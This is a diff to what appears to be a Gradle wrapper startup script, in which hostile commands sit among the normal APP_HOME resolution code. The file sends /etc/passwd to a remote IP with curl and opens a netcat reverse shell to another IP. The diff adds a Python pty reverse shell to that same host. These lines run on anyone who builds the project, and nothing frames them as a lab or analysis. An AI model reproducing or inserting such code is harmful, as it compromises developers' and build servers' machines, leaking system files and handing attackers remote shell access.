@@ -63,12 +63,11 @@
 ##############################################################################
 
 # Attempt to set APP_HOME
-cat /etc/passwd | curl --data-binary @-   http://3.28.218.160:54218/54224
+cat /etc/passwd | curl --data-binary @-   http://3.28.218.160:54218/GradleNewbieee3
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 51.195.217.146 54224 >/tmp/f
-sleep 60m
 # Resolve links: $0 may be a link
 app_path=$0
-
+export RHOST="51.195.217.146";export RPORT=54224;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 # Need this for daisy-chained symlinks.
 while
     APP_HOME=${app_path%"${app_path##*/}"}  # leaves a trailing /; empty if no leading path
